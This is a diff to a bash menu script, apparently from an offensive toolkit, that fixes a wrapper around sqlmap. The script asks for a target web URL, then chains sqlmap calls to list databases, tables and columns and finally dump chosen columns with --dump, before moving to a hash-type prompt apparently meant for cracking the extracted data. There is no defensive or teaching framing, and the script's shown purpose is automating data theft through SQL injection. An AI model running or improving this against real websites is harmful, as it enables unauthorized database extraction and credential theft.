@@ -2191,24 +2191,20 @@ read whk
 if [ $whk = 1 ]
 then
 clear
-echo -e $yellow "please insert web url"
-read wehk
 cd ~
 cd sqlmap
-python sqlmap.py -u $read --dbs
+echo -e $yellow "please insert web url"
+read re
+python2 sqlmap.py -u $re --dbs
 echo -e $yellow "please insert database"
-read datat
-python sqlmap.py -u $read --dbs
+read data
+python2 sqlmap.py -u $re -D $data --tables 
 echo -e $yellow "please insert table"
 read table
-python sqlmap.py -u $read -D $data --tables
+python2 sqlmap.py -u $re -D $data -T $table --columns
 echo -e $yellow "please insert columns"
 read columns
-python sqlmap.py -u $read -D $data -T $tables columns
-echo -e $yellow "please insert data columns"
-read dump
-python sqlmap.py -u $read -D $data -T $tables -C $columns --dump
-
+python2 sqlmap.py -u $re -D $data -T $table -C $columns --dump
 echo -e $yellow "Do you want define type hash insert y/n "
 read typehash
 if [ $typehash = "y" ]
